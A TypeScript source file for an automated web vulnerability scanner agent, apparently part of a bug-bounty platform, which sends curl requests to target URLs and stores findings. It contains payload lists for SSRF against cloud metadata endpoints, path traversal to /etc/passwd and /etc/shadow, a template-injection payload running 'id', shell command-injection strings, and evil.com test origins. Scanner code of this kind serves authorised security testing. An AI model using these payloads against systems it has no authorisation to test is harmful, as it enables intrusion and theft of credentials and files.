import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import logger from '../utils/logger';
import database from '../services/database';
import storage from '../services/storage';
import events from '../services/events';

export interface WebVulnsJob extends BaseJob {
  programId: string;
  urls: string[];
  options: {
    testSsrf?: boolean;
    testLfi?: boolean;
    testSsti?: boolean;
    testCors?: boolean;
    testCrlf?: boolean;
    testOpenRedirect?: boolean;
    testCommandInjection?: boolean;
    testPrototypePollution?: boolean;
    testSmuggling?: boolean;
    testWebCache?: boolean;
    test4xxBypass?: boolean;
    threads?: number;
    timeout?: number;
    interactshServer?: string;
  };
}

export interface WebVulnsResult {
  ssrf: Array<WebVulnerability>;
  lfi: Array<WebVulnerability>;
  ssti: Array<WebVulnerability>;
  cors: Array<WebVulnerability>;
  crlf: Array<WebVulnerability>;
  openRedirect: Array<WebVulnerability>;
  commandInjection: Array<WebVulnerability>;
  prototypePollution: Array<WebVulnerability>;
  smuggling: Array<WebVulnerability>;
  webCache: Array<WebVulnerability>;
  bypass4xx: Array<WebVulnerability>;
  testedUrls: number;
  executionTime: number;
}

export interface WebVulnerability {
  url: string;
  parameter?: string;
  method: string;
  payload: string;
  evidence: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  confidence: number;
  poc: string;
  type: string;
}

/**
 * Comprehensive Web Vulnerabilities Scanner Agent
 *
 * Tests for:
 * - SSRF (Server-Side Request Forgery)
 * - LFI (Local File Inclusion)
 * - SSTI (Server-Side Template Injection)
 * - CORS Misconfigurations
 * - CRLF Injection
 * - Open Redirects
 * - Command Injection
 * - Prototype Pollution
 * - HTTP Request Smuggling
 * - Web Cache Poisoning
 * - 4XX Bypass Techniques
 */
export class WebVulnsAgent extends BaseAgent<WebVulnsJob> {
  constructor() {
    super('webvulns' as any);
  }
  protected getSteps() {
    return [
      {
            name: "Load targets for web vulnerability scan",
            metadata: {}
      },
      {
            name: "Run specialized web scanners",
            metadata: {}
      },
      {
            name: "Analyze and classify vulnerabilities",
            metadata: {}
      },
      {
            name: "Store web vulnerability findings",
            metadata: {}
      }
];
  }


  async process(job: Job<WebVulnsJob>): Promise<WebVulnsResult> {
    const { programId, urls, options } = job.data;
    const startTime = Date.now();

    await this.updateJobStatus(job.id, 'active');
    await this.logExecution(
      job.id,
      programId,
      'webvulns',
      'start',
      'info',
      `Starting web vulnerability scanning on ${urls.length} URLs`
    );

    const result: WebVulnsResult = {
      ssrf: [],
      lfi: [],
      ssti: [],
      cors: [],
      crlf: [],
      openRedirect: [],
      commandInjection: [],
      prototypePollution: [],
      smuggling: [],
      webCache: [],
      bypass4xx: [],
      testedUrls: 0,
      executionTime: 0,
    };

    try {
      // SSRF Testing
      if (options.testSsrf !== false) {
        await this.logExecution(job.id, programId, 'ssrf', 'start', 'info', 'Testing for SSRF vulnerabilities');
        result.ssrf = await this.testSsrf(urls, options, job.id, programId);
      }

      // LFI Testing
      if (options.testLfi !== false) {
        await this.logExecution(job.id, programId, 'lfi', 'start', 'info', 'Testing for LFI vulnerabilities');
        result.lfi = await this.testLfi(urls, options, job.id, programId);
      }

      // SSTI Testing
      if (options.testSsti !== false) {
        await this.logExecution(job.id, programId, 'ssti', 'start', 'info', 'Testing for SSTI vulnerabilities');
        result.ssti = await this.testSsti(urls, options, job.id, programId);
      }

      // CORS Testing
      if (options.testCors !== false) {
        await this.logExecution(job.id, programId, 'cors', 'start', 'info', 'Testing for CORS misconfigurations');
        result.cors = await this.testCors(urls, options, job.id, programId);
      }

      // CRLF Testing
      if (options.testCrlf !== false) {
        await this.logExecution(job.id, programId, 'crlf', 'start', 'info', 'Testing for CRLF injection');
        result.crlf = await this.testCrlf(urls, options, job.id, programId);
      }

      // Open Redirect Testing
      if (options.testOpenRedirect !== false) {
        await this.logExecution(job.id, programId, 'open-redirect', 'start', 'info', 'Testing for open redirects');
        result.openRedirect = await this.testOpenRedirect(urls, options, job.id, programId);
      }

      // Command Injection Testing
      if (options.testCommandInjection !== false) {
        await this.logExecution(job.id, programId, 'cmdi', 'start', 'info', 'Testing for command injection');
        result.commandInjection = await this.testCommandInjection(urls, options, job.id, programId);
      }

      // Prototype Pollution Testing
      if (options.testPrototypePollution !== false) {
        await this.logExecution(job.id, programId, 'pp', 'start', 'info', 'Testing for prototype pollution');
        result.prototypePollution = await this.testPrototypePollution(urls, options, job.id, programId);
      }

      // HTTP Smuggling Testing
      if (options.testSmuggling !== false) {
        await this.logExecution(job.id, programId, 'smuggling', 'start', 'info', 'Testing for HTTP request smuggling');
        result.smuggling = await this.testSmuggling(urls, options, job.id, programId);
      }

      // Web Cache Testing
      if (options.testWebCache !== false) {
        await this.logExecution(job.id, programId, 'cache', 'start', 'info', 'Testing for web cache vulnerabilities');
        result.webCache = await this.testWebCache(urls, options, job.id, programId);
      }

      // 4XX Bypass Testing
      if (options.test4xxBypass !== false) {
        await this.logExecution(job.id, programId, '4xx-bypass', 'start', 'info', 'Testing for 4XX bypasses');
        result.bypass4xx = await this.test4xxBypass(urls, options, job.id, programId);
      }

      result.testedUrls = urls.length;
      result.executionTime = Date.now() - startTime;

      // Save all findings
      await this.saveFindings(programId, result);

      await this.logExecution(
        job.id,
        programId,
        'webvulns',
        'complete',
        'info',
        `Web vulnerability scanning complete: ${this.countVulnerabilities(result)} total vulnerabilities found`
      );

      await this.updateJobStatus(job.id, 'completed', result);
      return result;
    } catch (error: any) {
      await this.logExecution(job.id, programId, 'webvulns', 'error', 'error', error.message);
      await this.updateJobStatus(job.id, 'failed', null, error.message);
      throw error;
    }
  }

  /**
   * Test for SSRF vulnerabilities
   */
  private async testSsrf(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const interactshServer = options.interactshServer || process.env.INTERACTSH_SERVER || 'interact.sh';

      // Generate unique interactsh subdomain
      const uniqueId = `ssrf-${jobId.substring(0, 8)}`;
      const callbackUrl = `http://${uniqueId}.${interactshServer}`;

      const ssrfPayloads = [
        callbackUrl,
        `http://169.254.169.254/latest/meta-data/`, // AWS metadata
        `http://metadata.google.internal/computeMetadata/v1/`, // GCP metadata
        `http://127.0.0.1:80`,
        `http://localhost:22`,
        `file:///etc/passwd`,
        `gopher://127.0.0.1:25/_MAIL%20FROM:<test@test.com>`,
      ];

      for (const url of urls.slice(0, 50)) {
        if (await this.shouldCancel(jobId)) break;

        for (const payload of ssrfPayloads) {
          const testUrl = url.includes('?') ? `${url}&url=${encodeURIComponent(payload)}` : `${url}?url=${encodeURIComponent(payload)}`;

          const curlCmd = `curl -s -L --max-time 10 "${testUrl}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 15000 });

          // Check for SSRF indicators
          if (
            stdout.includes('ami-id') || // AWS metadata
            stdout.includes('instance-id') ||
            stdout.includes('root:x:') || // /etc/passwd
            stdout.includes('computeMetadata') || // GCP
            stdout.includes('169.254.169.254')
          ) {
            vulnerabilities.push({
              url,
              parameter: 'url',
              method: 'GET',
              payload,
              evidence: stdout.substring(0, 500),
              severity: 'critical',
              confidence: 0.9,
              poc: `curl -X GET "${testUrl}"`,
              type: 'ssrf',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      // Check for interactsh callbacks
      await new Promise(resolve => setTimeout(resolve, 5000));
      // Note: In production, you'd query the interactsh API for callbacks

      logger.info({ count: vulnerabilities.length }, 'SSRF testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'SSRF testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for LFI vulnerabilities
   */
  private async testLfi(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const lfiPayloads = [
        '../../../../../../../etc/passwd',
        '../../../../../../../etc/shadow',
        '../../../../../../../etc/hosts',
        '....//....//....//....//....//etc/passwd',
        '../../../../../../../windows/win.ini',
        '../../../../../../../windows/system32/drivers/etc/hosts',
        'php://filter/convert.base64-encode/resource=index.php',
        'file:///etc/passwd',
      ];

      for (const url of urls.slice(0, 50)) {
        if (await this.shouldCancel(jobId)) break;

        for (const payload of lfiPayloads) {
          const testUrl = url.includes('?') ? `${url}&file=${encodeURIComponent(payload)}` : `${url}?file=${encodeURIComponent(payload)}`;

          const curlCmd = `curl -s -L --max-time 10 "${testUrl}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 15000 });

          // Check for LFI indicators
          if (
            stdout.includes('root:x:0:0') ||
            stdout.includes('[boot loader]') ||
            stdout.includes('[fonts]') ||
            stdout.includes('localhost')
          ) {
            vulnerabilities.push({
              url,
              parameter: 'file',
              method: 'GET',
              payload,
              evidence: stdout.substring(0, 500),
              severity: 'high',
              confidence: 0.95,
              poc: `curl -X GET "${testUrl}"`,
              type: 'lfi',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'LFI testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'LFI testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for SSTI vulnerabilities
   */
  private async testSsti(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const sstiPayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '${{7*7}}',
        '{{config}}',
        '{{self}}',
        '{{7*\'7\'}}',
        '{{request}}',
        '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
      ];

      for (const url of urls.slice(0, 50)) {
        if (await this.shouldCancel(jobId)) break;

        for (const payload of sstiPayloads) {
          const testUrl = url.includes('?') ? `${url}&template=${encodeURIComponent(payload)}` : `${url}?template=${encodeURIComponent(payload)}`;

          const curlCmd = `curl -s -L --max-time 10 "${testUrl}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 15000 });

          // Check for SSTI indicators
          if (
            stdout.includes('49') || // 7*7 = 49
            stdout.includes('7777777') || // 7*'7'
            stdout.includes('<Config') ||
            stdout.includes('application')
          ) {
            vulnerabilities.push({
              url,
              parameter: 'template',
              method: 'GET',
              payload,
              evidence: stdout.substring(0, 500),
              severity: 'critical',
              confidence: 0.85,
              poc: `curl -X GET "${testUrl}"`,
              type: 'ssti',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'SSTI testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'SSTI testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for CORS misconfigurations
   */
  private async testCors(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const testOrigins = [
        'https://evil.com',
        'http://evil.com',
        'null',
        'https://attacker.com',
      ];

      for (const url of urls.slice(0, 100)) {
        if (await this.shouldCancel(jobId)) break;

        for (const origin of testOrigins) {
          const curlCmd = `curl -s -H "Origin: ${origin}" -I "${url}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 10000 });

          // Check for CORS misconfiguration
          if (
            stdout.includes(`Access-Control-Allow-Origin: ${origin}`) &&
            stdout.includes('Access-Control-Allow-Credentials: true')
          ) {
            vulnerabilities.push({
              url,
              method: 'GET',
              payload: origin,
              evidence: stdout.substring(0, 500),
              severity: 'high',
              confidence: 1.0,
              poc: `curl -H "Origin: ${origin}" -I "${url}"`,
              type: 'cors',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 50));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'CORS testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'CORS testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for CRLF injection
   */
  private async testCrlf(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const crlfPayloads = [
        '%0d%0aSet-Cookie:%20test=crlf',
        '%0d%0aX-Injected-Header:%20crlf',
        '%0aSet-Cookie:%20test=crlf',
        '%0dSet-Cookie:%20test=crlf',
        '\r\nSet-Cookie: test=crlf',
      ];

      for (const url of urls.slice(0, 50)) {
        if (await this.shouldCancel(jobId)) break;

        for (const payload of crlfPayloads) {
          const testUrl = url.includes('?') ? `${url}&redirect=${payload}` : `${url}?redirect=${payload}`;

          const curlCmd = `curl -s -I "${testUrl}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 10000 });

          // Check for CRLF injection
          if (
            stdout.includes('Set-Cookie: test=crlf') ||
            stdout.includes('X-Injected-Header: crlf')
          ) {
            vulnerabilities.push({
              url,
              parameter: 'redirect',
              method: 'GET',
              payload,
              evidence: stdout.substring(0, 500),
              severity: 'medium',
              confidence: 0.9,
              poc: `curl -I "${testUrl}"`,
              type: 'crlf',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'CRLF testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'CRLF testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for open redirects
   */
  private async testOpenRedirect(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const redirectPayloads = [
        'https://evil.com',
        '//evil.com',
        '///evil.com',
        'https:evil.com',
        '\\\\evil.com',
        'javascript:alert(1)',
      ];

      for (const url of urls.slice(0, 50)) {
        if (await this.shouldCancel(jobId)) break;

        for (const payload of redirectPayloads) {
          const testUrl = url.includes('?')
            ? `${url}&redirect=${encodeURIComponent(payload)}&url=${encodeURIComponent(payload)}&next=${encodeURIComponent(payload)}`
            : `${url}?redirect=${encodeURIComponent(payload)}`;

          const curlCmd = `curl -s -I -L --max-redirs 3 "${testUrl}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 10000 });

          // Check for redirect to evil.com
          if (
            stdout.includes('Location: https://evil.com') ||
            stdout.includes('Location: //evil.com') ||
            stdout.includes('evil.com')
          ) {
            vulnerabilities.push({
              url,
              parameter: 'redirect',
              method: 'GET',
              payload,
              evidence: stdout.substring(0, 500),
              severity: 'medium',
              confidence: 0.85,
              poc: `curl -I -L "${testUrl}"`,
              type: 'open-redirect',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'Open redirect testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Open redirect testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for command injection
   */
  private async testCommandInjection(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const cmdiPayloads = [
        '; sleep 5',
        '| sleep 5',
        '`sleep 5`',
        '$(sleep 5)',
        '& sleep 5',
        '; ping -c 5 127.0.0.1',
        '| whoami',
      ];

      for (const url of urls.slice(0, 30)) {
        if (await this.shouldCancel(jobId)) break;

        for (const payload of cmdiPayloads) {
          const testUrl = url.includes('?') ? `${url}&cmd=${encodeURIComponent(payload)}` : `${url}?cmd=${encodeURIComponent(payload)}`;

          const startTime = Date.now();
          const curlCmd = `curl -s -L --max-time 15 "${testUrl}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 20000 });
          const responseTime = Date.now() - startTime;

          // Check for command injection indicators
          if (
            (payload.includes('sleep') && responseTime > 4500) ||
            stdout.includes('uid=') ||
            stdout.includes('root') && stdout.includes('bin')
          ) {
            vulnerabilities.push({
              url,
              parameter: 'cmd',
              method: 'GET',
              payload,
              evidence: `Response time: ${responseTime}ms, Output: ${stdout.substring(0, 300)}`,
              severity: 'critical',
              confidence: 0.8,
              poc: `curl -X GET "${testUrl}"`,
              type: 'command-injection',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 200));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'Command injection testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Command injection testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for prototype pollution
   */
  private async testPrototypePollution(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const ppPayloads = [
        '__proto__[polluted]=true',
        'constructor.prototype.polluted=true',
        '__proto__.polluted=true',
      ];

      for (const url of urls.slice(0, 30)) {
        if (await this.shouldCancel(jobId)) break;

        for (const payload of ppPayloads) {
          const testUrl = url.includes('?') ? `${url}&${payload}` : `${url}?${payload}`;

          const curlCmd = `curl -s -L --max-time 10 "${testUrl}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 15000 });

          // Check response for pollution indicators
          if (stdout.includes('polluted') && stdout.includes('true')) {
            vulnerabilities.push({
              url,
              parameter: '__proto__',
              method: 'GET',
              payload,
              evidence: stdout.substring(0, 500),
              severity: 'high',
              confidence: 0.7,
              poc: `curl -X GET "${testUrl}"`,
              type: 'prototype-pollution',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'Prototype pollution testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Prototype pollution testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for HTTP request smuggling
   */
  private async testSmuggling(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      // Use smuggler.py or similar tool
      for (const url of urls.slice(0, 20)) {
        if (await this.shouldCancel(jobId)) break;

        const smugglerCmd = `python3 /opt/tools/smuggler.py -u "${url}" 2>/dev/null || echo ""`;
        const { stdout } = await this.executeCommand(smugglerCmd, { timeout: 60000 });

        if (stdout.includes('vulnerable') || stdout.includes('potential smuggling')) {
          vulnerabilities.push({
            url,
            method: 'POST',
            payload: 'CL.TE / TE.CL smuggling attempt',
            evidence: stdout.substring(0, 500),
            severity: 'high',
            confidence: 0.8,
            poc: stdout,
            type: 'http-smuggling',
          });
        }

        await new Promise(resolve => setTimeout(resolve, 500));
      }

      logger.info({ count: vulnerabilities.length }, 'HTTP smuggling testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'HTTP smuggling testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for web cache vulnerabilities
   */
  private async testWebCache(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      for (const url of urls.slice(0, 30)) {
        if (await this.shouldCancel(jobId)) break;

        // Test cache poisoning with X-Forwarded-Host
        const testHeaders = [
          '-H "X-Forwarded-Host: evil.com"',
          '-H "X-Forwarded-Scheme: nothttps"',
          '-H "X-Original-URL: /admin"',
        ];

        for (const header of testHeaders) {
          const curlCmd = `curl -s ${header} "${url}" 2>&1 || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 10000 });

          if (stdout.includes('evil.com') || stdout.includes('nothttps')) {
            vulnerabilities.push({
              url,
              method: 'GET',
              payload: header,
              evidence: stdout.substring(0, 500),
              severity: 'medium',
              confidence: 0.7,
              poc: `curl ${header} "${url}"`,
              type: 'web-cache-poisoning',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'Web cache testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Web cache testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for 4XX bypass techniques
   */
  private async test4xxBypass(
    urls: string[],
    options: WebVulnsJob['options'],
    jobId: string,
    programId: string
  ): Promise<Array<WebVulnerability>> {
    const vulnerabilities: Array<WebVulnerability> = [];

    try {
      const bypassTechniques = [
        { name: 'X-Original-URL', header: '-H "X-Original-URL: /admin"' },
        { name: 'X-Rewrite-URL', header: '-H "X-Rewrite-URL: /admin"' },
        { name: 'X-Custom-IP-Authorization', header: '-H "X-Custom-IP-Authorization: 127.0.0.1"' },
        { name: 'X-Originating-IP', header: '-H "X-Originating-IP: 127.0.0.1"' },
        { name: 'X-Forwarded-For', header: '-H "X-Forwarded-For: 127.0.0.1"' },
        { name: 'X-Remote-IP', header: '-H "X-Remote-IP: 127.0.0.1"' },
        { name: 'X-Client-IP', header: '-H "X-Client-IP: 127.0.0.1"' },
        { name: 'X-Host', header: '-H "X-Host: 127.0.0.1"' },
        { name: 'Referer', header: '-H "Referer: https://localhost/admin"' },
      ];

      for (const url of urls.slice(0, 30)) {
        if (await this.shouldCancel(jobId)) break;

        // First, check if URL returns 4XX
        const { stdout: baseline } = await this.executeCommand(`curl -s -o /dev/null -w "%{http_code}" "${url}" || echo "000"`, { timeout: 10000 });

        if (!baseline.trim().startsWith('4')) {
          continue; // Skip non-4XX URLs
        }

        for (const technique of bypassTechniques) {
          const curlCmd = `curl -s -o /dev/null -w "%{http_code}" ${technique.header} "${url}" || echo "000"`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 10000 });

          const statusCode = stdout.trim();
          if (statusCode === '200' || statusCode === '301' || statusCode === '302') {
            vulnerabilities.push({
              url,
              method: 'GET',
              payload: technique.header,
              evidence: `Bypassed ${baseline.trim()} → ${statusCode}`,
              severity: 'high',
              confidence: 0.9,
              poc: `curl ${technique.header} "${url}"`,
              type: '4xx-bypass',
            });
          }

          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, '4XX bypass testing complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, '4XX bypass testing failed');
      return vulnerabilities;
    }
  }

  /**
   * Count total vulnerabilities across all categories
   */
  private countVulnerabilities(result: WebVulnsResult): number {
    return Object.keys(result)
      .filter(key => !['testedUrls', 'executionTime'].includes(key))
      .reduce((sum, key) => sum + (result[key as keyof WebVulnsResult] as any[]).length, 0);
  }

  /**
   * Save all findings to database
   */
  private async saveFindings(programId: string, result: WebVulnsResult): Promise<void> {
    const allVulns = [
      ...result.ssrf.map(v => ({ ...v, category: 'ssrf' })),
      ...result.lfi.map(v => ({ ...v, category: 'lfi' })),
      ...result.ssti.map(v => ({ ...v, category: 'ssti' })),
      ...result.cors.map(v => ({ ...v, category: 'cors' })),
      ...result.crlf.map(v => ({ ...v, category: 'crlf' })),
      ...result.openRedirect.map(v => ({ ...v, category: 'open-redirect' })),
      ...result.commandInjection.map(v => ({ ...v, category: 'command-injection' })),
      ...result.prototypePollution.map(v => ({ ...v, category: 'prototype-pollution' })),
      ...result.smuggling.map(v => ({ ...v, category: 'http-smuggling' })),
      ...result.webCache.map(v => ({ ...v, category: 'web-cache' })),
      ...result.bypass4xx.map(v => ({ ...v, category: '4xx-bypass' })),
    ];

    for (const vuln of allVulns) {
      try {
        await database.query(
          `INSERT INTO findings (
            program_id, title, description, severity, confidence, status,
            evidence, poc, tags
          ) VALUES ($1, $2, $3, $4, $5, 'new', $6, $7, $8)
          ON CONFLICT DO NOTHING`,
          [
            programId,
            `${vuln.type.toUpperCase()} Vulnerability`,
            `${vuln.type} vulnerability found at ${vuln.url}`,
            vuln.severity,
            vuln.confidence,
            JSON.stringify([
              { type: 'request', content: vuln.url, metadata: { parameter: vuln.parameter } },
              { type: 'response', content: vuln.evidence },
            ]),
            JSON.stringify({
              steps: [`Test ${vuln.type}`, `Use payload: ${vuln.payload}`],
              curl: vuln.poc,
              payload: vuln.payload,
              reproductionRate: vuln.confidence,
            }),
            [vuln.type, vuln.category, vuln.parameter || 'unknown'],
          ]
        );

        await events.emitFinding({
          programId,
          severity: vuln.severity,
          title: `${vuln.type.toUpperCase()} Vulnerability`,
          url: vuln.url,
        } as any);
      } catch (error: any) {
        logger.error({ error: error.message }, 'Failed to save finding');
      }
    }

    logger.info({ count: allVulns.length, programId }, 'Web vulnerability findings saved');
  }
}
